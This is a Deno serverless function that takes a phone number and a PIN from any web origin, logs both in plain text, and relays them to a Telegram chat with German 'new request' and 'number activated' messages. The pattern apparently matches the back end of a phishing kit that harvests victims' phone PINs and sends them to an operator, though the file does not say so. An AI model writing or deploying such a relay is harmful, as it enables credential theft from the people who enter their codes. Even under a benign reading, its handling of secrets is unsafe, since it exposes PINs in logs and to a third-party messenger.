
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface TelegramNotificationRequest {
  phone: string;
  accessCode: string;
  type?: 'request' | 'activation'; // Add type to distinguish message types
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { phone, accessCode, type = 'request' }: TelegramNotificationRequest = await req.json();
    
    const botToken = Deno.env.get('TELEGRAM_BOT_TOKEN');
    const chatId = Deno.env.get('TELEGRAM_CHAT_ID');
    
    if (!botToken || !chatId) {
      console.error('Missing Telegram credentials');
      return new Response(
        JSON.stringify({ error: 'Missing Telegram credentials' }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Create different messages based on type
    let message: string;
    if (type === 'activation') {
      message = `✅ Nummer Aktiviert!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
    } else {
      message = `🔔 Neue Anfrage eingegangen!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
    }
    
    console.log(`Sending Telegram notification (${type}):`, { phone, accessCode });
    
    const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
      }),
    });

    if (!telegramResponse.ok) {
      const errorText = await telegramResponse.text();
      console.error('Telegram API error:', errorText);
      return new Response(
        JSON.stringify({ error: 'Failed to send Telegram message' }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const result = await telegramResponse.json();
    console.log(`Telegram notification (${type}) sent successfully:`, result);

    return new Response(
      JSON.stringify({ success: true, result }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    console.error('Error in send-telegram-notification function:', error);
    return new Response(
      JSON.stringify({ error: error.message }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
